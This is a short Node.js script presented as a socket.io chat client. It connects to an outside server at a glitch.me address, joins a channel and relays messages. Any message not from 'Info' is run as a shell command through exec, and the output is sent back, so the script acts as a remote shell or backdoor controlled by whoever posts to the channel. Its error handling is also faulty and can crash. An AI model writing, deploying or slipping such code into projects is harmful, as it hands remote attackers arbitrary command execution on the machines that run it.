var socket = require('socket.io-client')('https://dev-talk.glitch.me/'),//server
username = process.argv[2],
channel = process.argv[3],
{ exec } = require('child_process'),
chalk = require('chalk');
socket.on('connect', () => {
console.log(`username: ${chalk.green(username)} , Channel: ${chalk.red(channel)}`);
socket.emit('join', { username: username, channel: channel });
})
socket.on('message', ({ user, msg, channel }) => function(user, msg, channel = this.channel) {
switch (user) {
case 'Info':
console.log(`(${chalk.yellow(user)}): ${chalk.yellow(msg)} (${chalk.yellow('channel')}: ${chalk.red(channel)})`);
break;
default:
if(msg.includes('stop')) process.exit(0)
else if(!msg.length==0){
    exec(msg, (err, stdout, stderr) => {
if(err || stderr) console.error(err || stderr) , Emit(err.message || stderr.message)
Emit(stdout)
});}}}(user, msg, channel));
function Emit(stdout) {
socket.emit('message', { user: username, msg: stdout });
}